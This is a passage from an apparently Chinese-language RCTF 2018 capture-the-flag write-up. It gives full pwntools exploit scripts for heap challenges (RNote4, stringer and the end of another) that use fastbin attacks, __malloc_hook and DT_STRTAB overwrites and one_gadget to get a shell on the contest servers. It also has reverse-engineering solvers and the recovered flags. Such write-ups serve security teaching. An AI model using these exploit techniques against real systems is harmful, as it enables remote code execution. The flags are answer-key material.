class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">base=libc<span class="number">-0x3C4B78</span></span><br><span class="line"></span><br><span class="line">malloc_hook=base+e.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="string">'3\n'</span>,<span class="number">0xa0</span>,<span class="string">'c\n'</span>)</span><br><span class="line">add(<span class="string">'4\n'</span>,<span class="number">0x68</span>,<span class="string">'d\n'</span>)</span><br><span class="line">add(<span class="string">'5\n'</span>,<span class="number">0x68</span>,<span class="string">'e\n'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="string">'4\n'</span>)</span><br><span class="line">delete(<span class="string">'a\n'</span>)</span><br><span class="line">edit(<span class="string">'\n'</span>,p64(malloc_hook<span class="number">-0x23</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="string">'6\n'</span>,<span class="number">0x68</span>,<span class="string">'f\n'</span>)</span><br><span class="line">add(<span class="string">'7\n'</span>,<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">3</span>+p64(base+<span class="number">0x4526a</span>)*<span class="number">2</span>+p64(base+<span class="number">0x846D0</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">se(<span class="string">'1\n'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>flag:<strong>RCTF{P1e4se_Be_C4refu1_W1th_Th3_P0inter_3c3d89}</strong></p><h3><span id="rnote4"><strong>RNote4</strong></span></h3><p>堆溢出，可以变成任意写...</p><p>然后改掉DT_STRTAB的值，改到bss段的一个地方，之后往上面放system，然后delete掉一个堆，这个时候会调用free，然后因为free是第一次被调用，会调用dl_resolve来找在libc中的地址 ，因为改了DT_STRTAB，所以会找到sysytem，变成调用system(“/bin/sh”);，之后就get shell了 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p=process(<span class="string">'RNote4'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so'</span>&#125;)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'rnote4.2018.teamrois.cn'</span>,<span class="number">6767</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">p.send(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(sz,content)</span>:</span></span><br><span class="line">se(<span class="string">'\x01'</span>)</span><br><span class="line">se(chr(sz))</span><br><span class="line">se(content)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,sz,content)</span>:</span></span><br><span class="line">se(<span class="string">'\x02'</span>)</span><br><span class="line">se(chr(idx))</span><br><span class="line">se(chr(sz))</span><br><span class="line">se(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">se(<span class="string">'\x03'</span>)</span><br><span class="line">se(chr(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr,content)</span>:</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x18</span>)+p64(addr)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">edit(<span class="number">1</span>,len(content),content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'b'</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x601EB0</span>,p64(<span class="number">0x602100</span>))</span><br><span class="line">write(<span class="number">0x602100</span>,<span class="string">'a'</span>*<span class="number">0x5F</span>+<span class="string">'system'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>flag:<strong>RCTF{I_kn0w_h0w_dl_f1xup_w0rks_503f8c}</strong></p><h3><span id="stringer"><strong>stringer</strong></span></h3><p>readstr 末尾不会强制+0</p><p>*(_BYTE *)(size - 1 + p) = 0;</p><p>根据size 来，可leak</p><p>calloc 会清空原来chunk上的内容,libc 2.23 设置 is_mmap bit 可以绕过</p><p>del 有 uaf</p><p>结合起来 构造 overlap + uaf</p><p>使用 edit 功能可以构造出来一个 overlap</p><p>有对齐。改最后一个 byte是不行的了，尝试第二个byte</p><p>almost</p><p>get it</p><p>思路</p><p>edit 修改 fastbin 的第二个byte 造成偏移</p><p>在偏移位置写一个 fake fastbin</p><p>libc 2.23 版本 calloc的时候如果 is_mmap bit 被设置了，不会清空</p><p>使用fake fastbin 修改一个 unsorted bin 的size 造成overlap</p><p>后面就是 leak 然后fastbin attack 的常规套路了 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">file_addr=<span class="string">'./stringer'</span></span><br><span class="line">libc_addr=<span class="string">'./libc.so.6'</span></span><br><span class="line">host=<span class="string">'stringer.2018.teamrois.cn'</span></span><br><span class="line">port=<span class="number">7272</span></span><br><span class="line"></span><br><span class="line">libc=ELF(‘./libc.so<span class="number">.6</span>’)</span><br><span class="line">p=remote(host,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc_hook_off=libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook_off=libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">unsorted_off=malloc_hook_off+<span class="number">88</span>+<span class="number">0x10</span></span><br><span class="line">fake_fastbin_malloc_hook=unsorted_off<span class="number">-88</span><span class="number">-0x13</span><span class="number">-0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(op)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice:'</span>,str(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newsome</span><span class="params">(num,con)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'length:'</span>,str(num))</span><br><span class="line">    p.sendlineafter(<span class="string">'content:'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showsome</span><span class="params">()</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editsome</span><span class="params">(index,byteindex)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(byteindex))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delsome</span><span class="params">(index)</span>:</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">newsome(<span class="number">0x28</span>,<span class="string">'0'</span>*(<span class="number">0x10</span><span class="number">-4</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line">newsome(<span class="number">0x100</span><span class="number">-0x20</span>,<span class="string">'1'</span>*<span class="number">0xc0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x33</span>)+p64(<span class="number">0</span>))</span><br><span class="line">newsome(<span class="number">0x100</span>,<span class="string">'2'</span>*<span class="number">0x10</span>)</span><br><span class="line">newsome(<span class="number">0x60</span>,<span class="string">'3'</span>*<span class="number">0x10</span>)</span><br><span class="line">newsome(<span class="number">0x28</span>,<span class="string">'4'</span>*<span class="number">0x10</span>)</span><br><span class="line">delsome(<span class="number">0</span>)</span><br><span class="line">delsome(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">editsome(<span class="number">4</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">newsome(<span class="number">0x28</span>,<span class="string">'5'</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">newsome(<span class="number">0x28</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x181</span>))</span><br><span class="line"></span><br><span class="line">delsome(<span class="number">2</span>)</span><br><span class="line">delsome(<span class="number">3</span>)</span><br><span class="line">newsome(<span class="number">0x80</span>,<span class="string">'7'</span>*<span class="number">0x10</span>)</span><br><span class="line">newsome(<span class="number">0x90</span>,<span class="string">'8'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x73</span>))</span><br><span class="line">delsome(<span class="number">8</span>)</span><br><span class="line">newsome(<span class="number">0x60</span>,<span class="string">'9'</span>*(<span class="number">0x20</span><span class="number">-1</span>))</span><br><span class="line">p.recvuntil(<span class="string">'99999999\n'</span>)</span><br><span class="line">leak=u64(p.recvline().strip().ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base=leak-unsorted_off</span><br><span class="line"></span><br><span class="line">leaksome[<span class="string">'leak'</span>]=leak</span><br><span class="line">leaksome[<span class="string">'libc_base'</span>]=libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite 2 0x71</span></span><br><span class="line"></span><br><span class="line">newsome(<span class="number">0x90</span>,<span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">delsome(<span class="number">10</span>)</span><br><span class="line">delsome(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">newsome(<span class="number">0x90</span>,<span class="string">'b'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(libc_base+fake_fastbin_malloc_hook))</span><br><span class="line"></span><br><span class="line">delsome(<span class="number">0xb</span>)</span><br><span class="line">newsome(<span class="number">0x60</span>,<span class="string">'c'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget=<span class="number">0xf02a4</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">newsome(<span class="number">0x60</span>,<span class="string">'d'</span>*<span class="number">3</span>+p64(libc_base+one_gadget)*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x90</span>))</span><br><span class="line"></span><br><span class="line">show_leak()</span><br><span class="line">exp_bp(<span class="string">'aaaaaaa'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>flag: **RCTF{Is_th1s_c1-1unk_m4pped?_df3ac9}**</p><h2><span id="0x03-re">0x03 RE</span></h2><h3><span id="babyre">babyre</span></h3><p>out数据4字节一组, 流程sub_80488E0, 算法sub_804868B(部分参数不相关), 字符0x20-0x7F穷举就完事儿了.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="keyword">uint32_t</span> foo(<span class="keyword">uint32_t</span> a1, <span class="keyword">uint64_t</span> a2) <span class="comment">// sub_804868B</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="keyword">uint64_t</span> v5;</span><br><span class="line"><span class="keyword">uint32_t</span> in;</span><br><span class="line">in = a1;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">527</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line">v5 = a2 &gt;&gt; (j &amp; <span class="number">0x1F</span>);</span><br><span class="line"><span class="keyword">if</span> (j &amp; <span class="number">0x20</span>)</span><br><span class="line">v5 = v5 &gt;&gt; <span class="number">32</span>;</span><br><span class="line">in = (in &gt;&gt; <span class="number">1</span>) ^ ((v5 ^ in ^ (in &gt;&gt; <span class="number">16</span>) ^ (<span class="number">0x5C743A2E</span> &gt;&gt; (((in &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>)</span><br><span class="line">+ <span class="number">2</span></span><br><span class="line">* (<span class="number">2</span></span><br><span class="line">* (((in &gt;&gt; <span class="number">20</span>) &amp; <span class="number">1</span>)</span><br><span class="line">+ <span class="number">2</span></span><br><span class="line">* (<span class="number">2</span> * ((in &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>)</span><br><span class="line">+ ((in &gt;&gt; <span class="number">26</span>) &amp; <span class="number">1</span>)))</span><br><span class="line">+ ((in &gt;&gt; <span class="number">9</span>) &amp; <span class="number">1</span>))))) &lt;&lt; <span class="number">31</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> in;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> data[<span class="number">30</span>] = <span class="comment">// out</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0xB80C91FE</span>,<span class="number">0x70573EFE</span>,</span><br><span class="line"><span class="number">0xBEED92AE</span>,<span class="number">0x7F7A8193</span>,</span><br><span class="line"><span class="number">0x7390C17B</span>,<span class="number">0x90347C6C</span>,</span><br><span class="line"><span class="number">0xAA7A15DF</span>,<span class="number">0xAA7A15DF</span>,</span><br><span class="line"><span class="number">0x526BA076</span>,<span class="number">0x153F1A32</span>,</span><br><span class="line"><span class="number">0x545C15AD</span>,<span class="number">0x7D8AA463</span>,</span><br><span class="line"><span class="number">0x526BA076</span>,<span class="number">0xFBCB7AA0</span>,</span><br><span class="line"><span class="number">0x7D8AA463</span>,<span class="number">0x9C513266</span>,</span><br><span class="line"><span class="number">0x526BA076</span>,<span class="number">0x6D7DF3E1</span>,</span><br><span class="line"><span class="number">0xAA7A15DF</span>,<span class="number">0x9C513266</span>,</span><br><span class="line"><span class="number">0x1EDC3864</span>,<span class="number">0x9323BC07</span>,</span><br><span class="line"><span class="number">0x7D8AA463</span>,<span class="number">0xFBCB7AA0</span>,</span><br><span class="line"><span class="number">0x153F1A32</span>,<span class="number">0x526BA076</span>,</span><br><span class="line"><span class="number">0xF5650025</span>,<span class="number">0xAA7A15DF</span>,</span><br><span class="line"><span class="number">0x1EDC3864</span>,<span class="number">0xB13AD888</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">uint32_t</span> j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0x20</span>; j &lt; <span class="number">0x7F</span>; j++)</span><br><span class="line"><span class="keyword">if</span> (foo(j, <span class="number">0x1D082C23A72BE4C1</span>) == data[i])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, j);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag: <strong>RCTF{Kee1o9_1s_a1ready_so1ved}</strong></p><h3><span id="simple-vm">simple vm</span></h3><p>p.bin是虚拟机字节码. 输入长32, 加密后与常量比较.</p><p>常量偏移+0x005, hex1018431415474017101D4B121F49481853540157515305565A08585F0A0C5809. 输入偏移+0x111, hex3031323334353637383941424344454630313233343536373839414243444546, 既"0123456789ABCDEF0123456789ABCDEF", 加密后hex101010101010101010106B696F696B69000000000000000000007B797F797B, 猜出算法解密常量.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"1018431415474017101D4B121F49481853540157515305565A08585F0A0C5809"</span>.decode(<span class="string">"hex"</span>)</span><br><span class="line">ss = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">0x20</span>):</span><br><span class="line">    ss = ss + (<span class="string">"%c"</span> % ((<span class="number">0x20</span>+i) ^ ord(s[i])))</span><br><span class="line"><span class="keyword">print</span> ss</span><br></pre></td></tr></table></figure><p>字节码分析(未完成):</p><blockquote><p>0130000000 jmp loc_30 1018431415474017101D4B121F49481853540157515305565A08585F0A0C5809 0001020304050600000000</p><p>loc_30: 1500010000 set p loc_35: 0E ++p 12 read p 0B putchar 0C 00010000 35000000 loop [100]+1=0A+1=0B times 66</p><p>1510010000 set p loc_47: 0E ++p 0A getchar 66 16 write p 0C 10010000 47000000 loop [110]+1=1F+1=20 times 66</p><p>loc_55:</p><p>03 40010000 mov reg1, [imm] [140] = 0x20 // xor key 10 mov reg2, reg1 11 F1000000 add reg1, imm 0xF1 = 0x111 // input offset 13 mov reg1, [reg1] 04 43010000 mov [imm], reg1 [0x143] 08 mov reg1, ~(reg2 &amp; reg1) 04 41010000 mov [imm], reg1 [0x141] 10 mov reg1, reg2 03 40010000 mov reg1, [imm] [140] 08 mov reg1, ~(reg2 &amp; reg1) 04 42010000 mov [imm], reg1 03 41010000 mov reg1, [imm] 03 43010000 mov reg1, [imm] 08 mov reg1, ~(reg2 &amp; reg1) 10 mov reg1, reg2 03 42010000 mov reg1, [142] 08 mov reg1, ~(reg2 &amp; reg1) 04 44010000 mov [144], reg1 66 03 40010000 11 F1000000 10 03 44010000 16 05 40010000 0E 06 40010000 0C 45010000 55000000 66</p><p>locB6: 03 46010000 mov reg1 imm 11 05000000 add reg1, imm 0x05 // const offset 13 mov reg1,[reg1] 10 mov reg2, reg1 03 46010000 mov reg1 imm 11 11010000 add reg1 imm 0x0111 13 mov reg1,[reg1] 17 cmp //memcmp 18 60010000 jne 0C 46010000 B60000000 17 60 1000066000000000000000000000000000000 000000000000000000000000000000 0A // 100 496E70757420466C61673A 0000000F 1F // 110 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 20000000 00 1F1F0000000000000000000557726F6E670A52696768740A00000015500100000E120B0C50010000650100000000000000 1556010000 0E 12 0B 0C500100007B010000 0000000000</p></blockquote><p>flag: <strong>RCTF{09a71bf084a93df7ce3def3ab1bd61f6}</strong></p><h3><span id="magic">magic</span></h3><p>第一部分校验_time64返回值. 找msvcrt._time64引用发现校验函数sub_402268, 用multiasm写shellcode调用程序自身代码跑time(运行前手动将00405020处0x100个字节复制到00404C00).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;0000000000404A00&gt;</span><br><span class="line">lea rax, [0000000000405FF0]</span><br><span class="line">mov dword ptr ds:[rax], 0x5AFFE78F</span><br><span class="line"></span><br><span class="line">@loop:</span><br><span class="line">lea rdi, [0000000000405020]</span><br><span class="line">lea rsi, [0000000000404C00]</span><br><span class="line">mov rcx, 0x100</span><br><span class="line">rep movsb</span><br><span class="line"></span><br><span class="line">call 0x0000000000402268</span><br><span class="line"></span><br><span class="line">lea rax, [0000000000405FF0]</span><br><span class="line">mov eax, [rax]</span><br><span class="line">cmp eax, 0x5B028A8F</span><br><span class="line">jge short @breakme</span><br><span class="line"></span><br><span class="line">lea rax, ds:[0x00000000004099D0]</span><br><span class="line">mov eax, dword ptr ds:[rax]</span><br><span class="line">test eax, eax</span><br><span class="line">je short @loop</span><br><span class="line"></span><br><span class="line">@breakme:</span><br><span class="line">nop ; set a breakpoint here</span><br><span class="line"></span><br><span class="line">@hooktime:</span><br><span class="line">lea rcx, [0000000000405FF0]</span><br><span class="line">mov eax, [rcx]</span><br><span class="line">add eax, 1</span><br><span class="line">mov [rcx], eax</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">&lt;0000000000402275&gt;</span><br><span class="line">call @hooktime</span><br></pre></td></tr></table></figure><p>跑出time: 0x5B00E398</p><p>第二部分虚拟机. 断msvcrt.scanf找到校验函数sub_4023B1. 取26字节输入rc4(可能修改过)加密后传入虚拟机. 字节码分析:</p><blockquote><p>AB0300 mov r3, 00 AB041A mov r4, 1A AB0066 mov r0, 66 AA0502 mov r5, r2 ; r2 = input A953 add r5, r3 A005 mov r5, [r5] AB06CC mov r6, CC A956 add r5, r6 AB06FF mov r6, FF AC56 and r5, r6 AE50 xor r5, r0 AD00 neg r0 AA0605 mov r6, r5 AA0501 mov r5, r1 ; r1 = const A953 add r5, r3 A005 mov r5, [r5] AF5600 div r5, 00 ; cmp r5, r6 A701CC jcc reg5 A935 add r3, r5 AA0503 mov r5, r3 AF5400 div r5, r4 ; cmp r5, r4 A6D1CC jcc !reg5</p></blockquote><p>常量解密:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b = [<span class="number">0x89</span>, <span class="number">0xC1</span>, <span class="number">0xEC</span>, <span class="number">0x50</span>, <span class="number">0x97</span>, <span class="number">0x3A</span>, <span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0xE4</span>, <span class="number">0xE6</span>, <span class="number">0xE4</span>, <span class="number">0x42</span>, <span class="number">0xCB</span>, <span class="number">0xD9</span>, <span class="number">0x08</span>, <span class="number">0x22</span>, <span class="number">0xAE</span>, <span class="number">0x9D</span>, <span class="number">0x7C</span>, <span class="number">0x07</span>, <span class="number">0x80</span>, <span class="number">0x8F</span>, <span class="number">0x1B</span>, <span class="number">0x45</span>, <span class="number">0x04</span>, <span class="number">0xE8</span>]</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line">k = [<span class="number">0x66</span>,<span class="number">0x99</span>] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">26</span>):</span><br><span class="line">    b[i] = b[i] ^ k[i &amp; <span class="number">1</span>]</span><br><span class="line">    b[i] = (b[i]+<span class="number">0x100</span><span class="number">-0xCC</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    s = s + (<span class="string">"%02X"</span> % b[i])</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>得到238CBEFD25D765F4B6B3B60FE174A2EFFC384ED21A4AB11096A5. 调试时手动替换rc4数据, 解密得"<span class="citation" data-cites="ck_For_fun_02508iO2_2iOR">@ck_For_fun_02508iO2_2iOR</span>}". 输入程序得到字符画:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">the part of flag was protected by a magic spell!</span><br><span class="line">@ck_For_fun_02508iO2_2iOR&#125;</span><br><span class="line">.843fFDCb52bc573DA7e336b4BCC97C6E.</span><br><span class="line">.1adC4b19FEBA1Bf9D182FAe8Eac1AeBF.</span><br><span class="line">.CB7EEFeD2B2D6dd76f   bE  D0 ec92.</span><br><span class="line">.DD1C36EDBaf56 